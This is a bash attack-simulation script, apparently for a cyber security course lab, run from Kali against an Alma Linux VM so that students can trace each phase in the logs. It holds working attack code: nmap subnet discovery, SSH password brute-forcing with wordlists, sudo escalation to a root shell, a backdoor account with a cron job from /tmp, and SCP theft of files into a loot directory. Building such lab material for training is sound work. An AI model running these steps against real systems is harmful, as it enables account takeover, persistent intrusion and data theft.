#!/bin/bash
# =============================================================================
# Linux Lab Attack Simulation Script v9
# Certificate IV in Cyber Security
# Run from Kali Linux against Alma Linux SSH Server
# =============================================================================
#
# ATTACK NARRATIVE — Full Kill Chain
# ==============================
#
# Phase 0 — Reconnaissance
#   nmap auto-discovers the target server from Kali's local subnet.
#   No manual IP configuration required. The script identifies the only
#   host with port 22 open (excluding Kali itself).
#   Log evidence: none on target (nmap output visible on Kali console only)
#
# Phase 1 — Credential Attack on jsmith
#   The attacker knows jsmith's username from prior OSINT (e.g. the name
#   appeared on the company website). They now run a short common password
#   wordlist against that specific account.
#   Pattern in logs: same username (jsmith), multiple different passwords,
#   rapid attempts → 'Failed password for jsmith' repeating, then 'Accepted'.
#   This is a targeted brute-force, NOT a spray.
#   Log evidence: journalctl -u sshd | grep 'jsmith'
#
# Phase 2 — Foothold and Internal Reconnaissance
#   Logged in as jsmith, the attacker enumerates local accounts via
#   /etc/passwd. This is standard post-compromise recon. The labadmin
#   account is visible in /etc/passwd — the attacker now has a new target.
#   Log evidence: 'Accepted password for jsmith' + PAM session open
#
# Phase 3 — Credential Attack on labadmin
#   Knowing labadmin exists from /etc/passwd, the attacker runs a longer
#   password wordlist against it. The pattern is identical to Phase 1 but
#   with more failures before success — giving students a richer dataset.
#   LabKeeper@2026 appears near the end of the wordlist.
#   Log evidence: journalctl -u sshd | grep 'labadmin'
#
# Phase 4 — Lateral Movement
#   The attacker opens a separate SSH session as labadmin. Two different
#   accounts accepted from the same source IP = lateral movement.
#   Log evidence: 'Accepted password for labadmin' (distinct from jsmith)
#
# Phase 5 — Privilege Escalation
#   labadmin is in the wheel group. The attacker uses sudo /bin/bash to
#   open an interactive root shell. All escalation entries are attributed
#   to labadmin — jsmith never appears in sudo logs.
#   Log evidence: journalctl | grep sudo | grep 'COMMAND=/bin/bash'
#
# Phase 6 — Persistence
#   Backdoor account (UID 1337), wheel group membership, cron job from /tmp.
#   Log evidence: journalctl | grep -iE 'useradd|usermod|CRON'
#
# Phase 7 — Data Exfiltration
#   Sensitive files PRE-EXIST in /var/company/crm/ (created during VHDX build), staged with find/cp/tar
#   (commands land in labadmin's bash history), then SCP-pulled to Kali.
#   auditd rules are pre-configured on the VHDX (persistent, syscall-level openat watches).
#   Log evidence: sshd SFTP sessions, ausearch -k exfil_watch, bash history
#
# COMPLETE EVIDENCE MAP
# ==============================
#   journalctl -u sshd | grep 'Failed password for jsmith'      <- Phase 1
#   journalctl -u sshd | grep 'Accepted password for jsmith'    <- Phase 2
#   journalctl -u sshd | grep 'Failed password for labadmin'    <- Phase 3
#   journalctl -u sshd | grep 'Accepted password for labadmin'  <- Phase 4
#   journalctl | grep sudo | grep 'COMMAND'                     <- Phase 5
#   journalctl | grep -iE 'new user|useradd'                    <- Phase 6
#   journalctl | grep -iE 'usermod|wheel'                       <- Phase 6
#   journalctl | grep -i 'CRON'                                 <- Phase 6
#   journalctl -u sshd | grep 'subsystem'                       <- Phase 7
#   sudo ausearch -k exfil_watch --format text                  <- Phase 7
#   cat /home/labadmin/.bash_history                            <- Phase 7
#
# =============================================================================
# CONFIGURATION
# No credentials need to be set here — all passwords are discovered by the
# attack phases below. Only adjust wordlists if you change server passwords.
# =============================================================================

# jsmith wordlist — short, Password123 near the end
# Rationale: attacker tries obvious passwords for a known username
JSMITH_WORDLIST=(
    "jsmith"
    "jsmith123"
    "welcome1"
    "Summer2024"
    "Password123"
    "Letmein1!"
)

# labadmin wordlist — longer, LabKeeper@2026 near the end
# Rationale: attacker is more persistent against an admin account
LABADMIN_WORDLIST=(
    "labadmin"
    "labadmin123"
    "Admin@2024"
    "Welcome1!"
    "P@ssw0rd1"
    "Lab@dmin1"
    "S3cur3Lab!"
    "AdminPass1"
    "T3chLab@99"
    "Cyber@2024"
    "LabKeeper@2026"
    "N3twork@Lab"
)

# Exfiltration settings
EXFIL_DIR="/var/company/crm"
EXFIL_FILES=("Q3_client_accounts.csv" "internal_credentials.txt" "network_config_backup.tar.gz")
LOOT_DIR="/tmp/loot"

# =============================================================================
# DO NOT EDIT BELOW THIS LINE
# =============================================================================

SSH_OPTS="-o StrictHostKeyChecking=no -o ConnectTimeout=8 -o BatchMode=no -o NumberOfPasswordPrompts=1"

# Runtime variables — populated by the attack phases, not pre-configured
SERVER_IP=""
JSMITH_PASS=""
LABADMIN_USER="labadmin"
LABADMIN_PASS=""

# =============================================================================
# Utility functions
# =============================================================================

phase() {
    echo ""
    echo "============================================"
    echo "  $1"
    echo "============================================"
    echo ""
}
step()  { echo "  [*] $1"; }
ok()    { echo "  [+] $1"; }
fail()  { echo "  [!] $1"; }
try()   { echo "      [>] $1"; }

# =============================================================================
# Pre-flight: check dependencies
# =============================================================================

phase "Pre-flight Checks"

for tool in sshpass nmap; do
    if ! command -v "$tool" &>/dev/null; then
        step "$tool not found — installing..."
        sudo apt install -y "$tool" 2>/dev/null
        if ! command -v "$tool" &>/dev/null; then
            fail "$tool install failed. Run: sudo apt install -y $tool"
            exit 1
        fi
        ok "$tool installed."
    else
        ok "$tool present."
    fi
done

# =============================================================================
# PHASE 0: Reconnaissance — auto-discover target IP
#
# NARRATIVE: The attacker knows there is a Linux SSH server on the local
# network but does not know its IP. An nmap scan of the subnet reveals the
# only host (other than Kali) with port 22 open. This is the target.
# =============================================================================

phase "Phase 0 — Reconnaissance"

step "Detecting local subnet from Kali's network interface..."

KALI_IP=$(ip route get 1 2>/dev/null \
    | awk '{for(i=1;i<=NF;i++) if($i=="src") print $(i+1)}' \
    | head -1)

if [ -z "$KALI_IP" ]; then
    KALI_IP=$(ip addr show \
        | awk '/inet / && !/127\.0\.0\.1/ {print $2}' \
        | cut -d/ -f1 | head -1)
fi

if [ -z "$KALI_IP" ]; then
    fail "Could not determine Kali IP. Check network configuration."
    exit 1
fi

SUBNET=$(echo "$KALI_IP" | cut -d. -f1-3).0/24
ok "Kali IP:  $KALI_IP"
step "Scanning $SUBNET for hosts with SSH (port 22) open..."
echo ""

nmap -sV -p 22 --open -T4 "$SUBNET" 2>/dev/null \
    | tee /tmp/nmap_scan.txt \
    | grep -E "Nmap scan|report for|22/tcp|ssh"

echo ""

# Extract first non-Kali host with port 22 open
SERVER_IP=$(grep "report for" /tmp/nmap_scan.txt \
    | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' \
    | grep -v "^${KALI_IP}$" \
    | head -1)

if [ -z "$SERVER_IP" ]; then
    fail "No SSH target found on $SUBNET (excluding Kali at $KALI_IP)."
    fail "Verify the Alma Linux VM is running and on the same network switch."
    exit 1
fi

ok "Target identified: $SERVER_IP"
step "Confirming target reachability..."

if ! ping -c 2 -W 3 "$SERVER_IP" &>/dev/null; then
    fail "Cannot reach $SERVER_IP — check Hyper-V virtual switch configuration."
    exit 1
fi

ok "Target $SERVER_IP is reachable. Proceeding."
sleep 3

# =============================================================================
# PHASE 1: Credential Attack on jsmith
#
# NARRATIVE: The attacker obtained jsmith's username through OSINT — for
# example, a staff directory on the company website listed "John Smith"
# with email j.smith@company.com. They now try a short list of common
# passwords against that specific account.
#
# Attack pattern: same username, multiple passwords = targeted brute-force.
# This is DIFFERENT from a password spray (one password, many usernames).
# Students should recognise the pattern from the log evidence.
#
# Note on SSH error messages — important teaching point:
#   'Failed password for invalid user X' = username does not exist
#   'Failed password for X'              = username EXISTS, wrong password
# The absence of 'invalid user' in jsmith's failures confirms the account
# is real — an attacker would notice this immediately.
# =============================================================================

phase "Phase 1 — Credential Attack on jsmith (OSINT-derived username)"

step "Target username: jsmith (obtained via OSINT)"
step "Method: short common password wordlist — same username, multiple passwords"
step "Delay: 2 seconds between attempts"
echo ""

for passwd in "${JSMITH_WORDLIST[@]}"; do
    try "jsmith : $passwd"
    sshpass -p "$passwd" ssh $SSH_OPTS \
        "jsmith@${SERVER_IP}" "exit" 2>/dev/null

    if [ $? -eq 0 ]; then
        JSMITH_PASS="$passwd"
        ok "CREDENTIAL FOUND — jsmith : $JSMITH_PASS"
        break
    fi
    sleep 2
done

echo ""
if [ -n "$JSMITH_PASS" ]; then
    ok "Phase 1 complete — jsmith credential acquired."
    ok "Log evidence: 'Failed password for jsmith' x $((${#JSMITH_WORDLIST[@]} - 1)) then 'Accepted'"
else
    fail "Phase 1 failed — jsmith password not found in wordlist."
    fail "Verify jsmith exists on the Alma server with password: Password123"
    fail "Check: sudo faillock --user jsmith --reset  (run on Alma server)"
    exit 1
fi
sleep 4

# =============================================================================
# PHASE 2: Foothold and Internal Reconnaissance
#
# NARRATIVE: With jsmith's password confirmed, the attacker logs in and
# immediately performs post-compromise recon. Viewing /etc/passwd reveals
# all local accounts — crucially, labadmin is listed. The attacker now has
# a named target for their next credential attack.
#
# This phase establishes a realistic reason WHY the attacker knows labadmin
# exists: they read it directly off the compromised system.
# =============================================================================

phase "Phase 2 — Foothold as jsmith + Internal Reconnaissance"

step "Logging in as jsmith — establishing foothold..."

sshpass -p "$JSMITH_PASS" ssh $SSH_OPTS \
    "jsmith@${SERVER_IP}" \
    "echo '[jsmith] Foothold established'; \
     echo ''; \
     echo '[*] Running post-compromise recon...'; \
     echo '[*] Enumerating local accounts via /etc/passwd:'; \
     echo '--- /etc/passwd excerpt ---'; \
     cat /etc/passwd | grep -vE '^(daemon|bin|sys|sync|halt|shutdown|mail|operator|games|ftp|nobody|dbus|systemd|polkitd|sshd|chrony|tss|unbound|setroubleshoot|cockpit|sssd|rpc|rpcuser|nfsnobody)' | cut -d: -f1,3,6,7; \
     echo '---------------------------'; \
     echo '[+] labadmin account identified — next target.'; \
     sleep 3; \
     exit"

if [ $? -eq 0 ]; then
    ok "Phase 2 complete — jsmith session logged, labadmin identified via /etc/passwd."
else
    fail "jsmith login failed unexpectedly after Phase 1 success."
    fail "Check account is not locked: sudo faillock --user jsmith --reset"
    exit 1
fi
sleep 5

# =============================================================================
# PHASE 3: Credential Attack on labadmin
#
# NARRATIVE: Having found labadmin in /etc/passwd, the attacker runs a
# longer password wordlist against it. Admin accounts often have stronger
# passwords, so the attacker is prepared for more attempts. The correct
# password (LabKeeper@2026) appears near the end of the list, producing
# a longer sequence of 'Failed password for labadmin' entries in the logs —
# a richer dataset for students to analyse.
#
# This phase produces the same pattern as Phase 1 but for a different
# account — students should recognise both as targeted brute-force.
# =============================================================================

phase "Phase 3 — Credential Attack on labadmin (discovered via /etc/passwd)"

step "Target: labadmin (found in /etc/passwd during jsmith session)"
step "Method: longer password wordlist — ${#LABADMIN_WORDLIST[@]} attempts"
step "Delay: 2 seconds between attempts"
echo ""

for passwd in "${LABADMIN_WORDLIST[@]}"; do
    try "labadmin : $passwd"
    sshpass -p "$passwd" ssh $SSH_OPTS \
        "${LABADMIN_USER}@${SERVER_IP}" "exit" 2>/dev/null

    if [ $? -eq 0 ]; then
        LABADMIN_PASS="$passwd"
        ok "CREDENTIAL FOUND — labadmin : $LABADMIN_PASS"
        break
    fi
    sleep 2
done

echo ""
if [ -n "$LABADMIN_PASS" ]; then
    ok "Phase 3 complete — labadmin credential acquired."
    ok "Log evidence: 'Failed password for labadmin' x $((${#LABADMIN_WORDLIST[@]} - 1)) then 'Accepted'"
else
    fail "Phase 3 failed — labadmin password not found in wordlist."
    fail "Verify labadmin exists on the Alma server with password: LabKeeper@2026"
    fail "Check: sudo faillock --user labadmin --reset  (run on Alma server)"
    exit 1
fi
sleep 4

# =============================================================================
# PHASE 4: Lateral Movement — login as labadmin
#
# NARRATIVE: The attacker now opens a separate SSH session as labadmin.
# In the sshd journal, students see two 'Accepted password' events from
# the same source IP for different accounts — this is the lateral movement
# indicator. labadmin's wheel group membership makes this pivot significant:
# the attacker has moved from a standard user to an account that can sudo.
# =============================================================================

phase "Phase 4 — Lateral Movement (labadmin login)"

step "Opening separate session as labadmin from same Kali IP..."
step "Two 'Accepted password' events from same IP for different users = lateral movement"

sshpass -p "$LABADMIN_PASS" ssh $SSH_OPTS \
    "${LABADMIN_USER}@${SERVER_IP}" \
    "echo '[labadmin] Lateral movement successful'; \
     echo '[*] Confirming wheel group membership:'; \
     id; groups; \
     sleep 3; \
     exit"

if [ $? -eq 0 ]; then
    ok "Phase 4 complete — labadmin login logged (lateral movement visible in sshd journal)."
else
    fail "labadmin login failed after Phase 3 success — unexpected."
    fail "Check: sudo faillock --user labadmin --reset  (run on Alma server)"
    exit 1
fi
sleep 5

# =============================================================================
# PHASE 5: Privilege Escalation — labadmin → root via sudo
#
# NARRATIVE: labadmin is in the wheel group. The attacker uses sudo to open
# an interactive root shell (/bin/bash). This is the red-flag command —
# legitimate administrators use sudo for specific tasks, not to spawn a
# persistent root shell. All sudo journal entries are attributed to labadmin.
# =============================================================================

phase "Phase 5 — Privilege Escalation (labadmin sudo /bin/bash)"

step "Escalating to root via sudo /bin/bash as labadmin..."

sshpass -p "$LABADMIN_PASS" ssh $SSH_OPTS -tt \
    "${LABADMIN_USER}@${SERVER_IP}" << ENDSSH
echo '[*] Escalating privileges...'
sleep 1

# Routine-looking sudo — provides cover and a normal-looking entry
echo '${LABADMIN_PASS}' | sudo -S id 2>/dev/null
sleep 2

# Suspicious: sudo /bin/bash opens interactive root shell
echo '${LABADMIN_PASS}' | sudo -S bash -c \
    'echo "[root] Interactive shell opened via sudo bash"; id; whoami; sleep 2'
sleep 1

echo '[+] Escalation complete.'
exit
ENDSSH

if [ $? -eq 0 ]; then
    ok "Phase 5 complete — sudo COMMAND=/bin/bash attributed to labadmin in journal."
else
    fail "Phase 5 failed. Confirm labadmin is in the wheel group on the Alma server:"
    fail "  Run on Alma: groups labadmin"
fi
sleep 5

# =============================================================================
# PHASE 6: Persistence
#
# NARRATIVE: With root access established, three persistence mechanisms are
# installed: a backdoor account (UID 1337), wheel group membership for that
# account, and a cron job executing a hidden script from /tmp. Together
# these ensure the attacker can return even if jsmith and labadmin passwords
# are both changed after the incident is discovered.
# =============================================================================

phase "Phase 6 — Persistence"

step "Installing three persistence mechanisms via labadmin sudo..."

sshpass -p "$LABADMIN_PASS" ssh $SSH_OPTS -tt \
    "${LABADMIN_USER}@${SERVER_IP}" << ENDSSH
sleep 1
echo '[*] Creating backdoor account (UID 1337)...'
echo '${LABADMIN_PASS}' | sudo -S useradd -m -u 1337 -s /bin/bash backdoor 2>/dev/null || true
echo '${LABADMIN_PASS}' | sudo -S bash -c "echo 'backdoor:Backdoor!2024' | chpasswd" 2>/dev/null
sleep 2

echo '[*] Adding backdoor to wheel group...'
echo '${LABADMIN_PASS}' | sudo -S usermod -aG wheel backdoor 2>/dev/null || true
sleep 2

echo '[*] Installing cron persistence...'
echo '${LABADMIN_PASS}' | sudo -S bash -c \
    'printf "#!/bin/bash\n# system maintenance\n" > /tmp/.update.sh \
    && chmod +x /tmp/.update.sh'
echo '${LABADMIN_PASS}' | sudo -S bash -c \
    'echo "*/5 * * * * root /tmp/.update.sh > /dev/null 2>&1" > /etc/cron.d/sys_update'
sleep 1

echo '[+] Persistence complete.'
exit
ENDSSH

if [ $? -eq 0 ]; then
    ok "Phase 6 complete — useradd, usermod, and cron entries logged."
else
    fail "Phase 6 failed — check sudo access for labadmin."
fi
sleep 5

# =============================================================================
# PHASE 7: Data Exfiltration
#
# Step 7a — Verify pre-existing files + auditd rules (pre-configured on VHDX)
# Step 7b — Stage files using find/cp/tar (lands in labadmin bash history)
# Step 7c — SCP-pull files from Kali (generates sshd SFTP session entries)
#
# NARRATIVE: With root access and persistence secured, the attacker turns
# to the primary objective — stealing data. Files are staged in /tmp before
# transfer to avoid directly accessing /var/company/crm/ from the SCP
# connection (a common evasion step). auditd records the file access
# regardless, because the rule watches the source directory.
# =============================================================================

phase "Phase 7a — Exfiltration: Pre-flight Verification"

step "Verifying sensitive data files exist (pre-created on VHDX)..."
step "Verifying auditd rules are active (pre-configured on VHDX)..."

# Each check runs as a separate ssh call with a simple inline command.
# This avoids the -tt + heredoc interaction where sshpass feeds the heredoc
# as interactive terminal input rather than executing it as a script.

# 1. Check directory exists
step "Checking /var/company/crm/ directory..."
DIR_CHECK=$(sshpass -p "$LABADMIN_PASS" ssh $SSH_OPTS     "${LABADMIN_USER}@${SERVER_IP}"     "test -d /var/company/crm && echo OK || echo MISSING")

if [ "$DIR_CHECK" != "OK" ]; then
    fail "/var/company/crm does not exist on the target."
    fail "Check VHDX build Step 4a — the data directory was not created."
    exit 1
fi
ok "  Directory /var/company/crm/ exists."

# 2. Check each data file individually
PREFLIGHT_OK=1
for fname in Q3_client_accounts.csv internal_credentials.txt network_config_backup.tar.gz; do
    RESULT=$(sshpass -p "$LABADMIN_PASS" ssh $SSH_OPTS         "${LABADMIN_USER}@${SERVER_IP}"         "test -f /var/company/crm/${fname} && echo OK || echo MISSING")
    if [ "$RESULT" = "OK" ]; then
        ok "  Found: ${fname}"
    else
        fail "  Missing: /var/company/crm/${fname} — check VHDX build Step 4a."
        PREFLIGHT_OK=0
    fi
done

# 3. Check auditd exfil_watch rule
# /etc/audit/rules.d/ is root:root 750 so labadmin cannot read it directly.
# Check /etc/audit/audit.rules instead — augenrules writes a compiled copy
# there which is typically world-readable. If that also fails, downgrade
# to a non-fatal warning so the lab still runs.
step "Checking auditd exfil_watch rule..."
AUDIT_CHECK=$(sshpass -p "$LABADMIN_PASS" ssh $SSH_OPTS \
    "${LABADMIN_USER}@${SERVER_IP}" \
    "grep -c exfil_watch /etc/audit/audit.rules 2>/dev/null || echo 0")

if [ "${AUDIT_CHECK:-0}" -gt 0 ] 2>/dev/null; then
    ok "  auditd exfil_watch rule confirmed in audit.rules (${AUDIT_CHECK} line(s))."
else
    step "  Cannot verify auditd rules as labadmin — rules.d/ not readable without sudo."
    step "  This is non-fatal. Manually verify on Alma server before running the lab:"
    step "    sudo auditctl -l | grep exfil_watch"
    step "  Expected: two lines containing exfil_watch"
    step "  Continuing — auditd evidence will still be captured if rules are loaded."
fi

if [ "$PREFLIGHT_OK" -eq 1 ]; then
    ok "Step 7a complete — all files present, auditd rules active."
else
    fail "Step 7a verification failed — review errors above before continuing."
    fail "Check VHDX build Steps 4a and 4b in the build addendum."
    exit 1
fi
sleep 3


# ── Step 7b: Stage files ──────────────────────────────────────────────────

phase "Phase 7b — Exfiltration: Staging Files"

step "Staging commands will appear in /home/labadmin/.bash_history..."

sshpass -p "$LABADMIN_PASS" ssh $SSH_OPTS -tt \
    "${LABADMIN_USER}@${SERVER_IP}" << ENDSSH
echo '[*] Locating sensitive files...'
find ${EXFIL_DIR} -type f -ls
sleep 2

echo '[*] Copying files to staging area in /tmp...'
cp ${EXFIL_DIR}/Q3_client_accounts.csv /tmp/cr.csv 2>/dev/null
cp ${EXFIL_DIR}/internal_credentials.txt /tmp/creds.txt 2>/dev/null
cp ${EXFIL_DIR}/network_config_backup.tar.gz /tmp/cfg.tar 2>/dev/null
sleep 1

echo '[*] Creating collection archive...'
tar -czf /tmp/.collection.tar.gz \
    /tmp/cr.csv /tmp/creds.txt /tmp/cfg.tar 2>/dev/null

echo '[+] Staging complete: /tmp/.collection.tar.gz'
exit
ENDSSH

if [ $? -eq 0 ]; then
    ok "Step 7b complete — staging commands in labadmin bash history."
else
    fail "Step 7b failed."
fi
sleep 3

# ── Step 7c: SCP pull from Kali ───────────────────────────────────────────

phase "Phase 7c — Exfiltration: SCP Pull to Kali"

step "Each file pulled separately — each generates a distinct SFTP subsystem entry..."
mkdir -p "$LOOT_DIR"

for fname in "${EXFIL_FILES[@]}"; do
    try "Pulling: $fname"
    sshpass -p "$LABADMIN_PASS" scp \
        -o StrictHostKeyChecking=no \
        -o ConnectTimeout=10 \
        "${LABADMIN_USER}@${SERVER_IP}:${EXFIL_DIR}/${fname}" \
        "${LOOT_DIR}/${fname}" 2>/dev/null
    sleep 2
done

try "Pulling: .collection.tar.gz (staged archive)"
sshpass -p "$LABADMIN_PASS" scp \
    -o StrictHostKeyChecking=no \
    -o ConnectTimeout=10 \
    "${LABADMIN_USER}@${SERVER_IP}:/tmp/.collection.tar.gz" \
    "${LOOT_DIR}/collection.tar.gz" 2>/dev/null

LOOT_COUNT=$(ls "$LOOT_DIR" 2>/dev/null | wc -l)
ok "Step 7c complete — $LOOT_COUNT file(s) in $LOOT_DIR on Kali."

# =============================================================================
# Final Summary
# =============================================================================

phase "Attack Simulation Complete — Evidence Verification"

cat << SUMMARY
  Attack summary:
    Kali (attacker):   $KALI_IP
    Alma (target):     $SERVER_IP
    jsmith password:   $JSMITH_PASS     (found by Phase 1 wordlist)
    labadmin password: $LABADMIN_PASS   (found by Phase 3 wordlist)

  Verify log evidence on the Alma server ($SERVER_IP):

  [Phase 1]  jsmith credential attack (same username, multiple passwords):
    journalctl -u sshd | grep 'jsmith'

  [Phase 2]  jsmith foothold session:
    journalctl -u sshd | grep 'Accepted password for jsmith'

  [Phase 3]  labadmin credential attack:
    journalctl -u sshd | grep 'labadmin'

  [Phase 4]  Lateral movement — labadmin login:
    journalctl -u sshd | grep 'Accepted password for labadmin'

  [Phase 5]  Privilege escalation:
    journalctl | grep sudo | grep 'COMMAND'

  [Phase 6]  Persistence:
    journalctl | grep -iE 'new user|useradd|usermod|wheel|crond'

  [Phase 7]  SCP exfiltration sessions:
    journalctl -u sshd | grep 'subsystem'

  [Phase 7]  auditd file access:
    sudo ausearch -k exfil_watch --format text | tail -40

  [Phase 7]  Staging commands in bash history:
    cat /home/labadmin/.bash_history | tail -20

  Full kill-chain timeline:
    journalctl --since '1 hour ago' -o short-iso | \\
      grep -iE 'sshd|sudo|useradd|usermod|cron|sftp'

============================================
SUMMARY
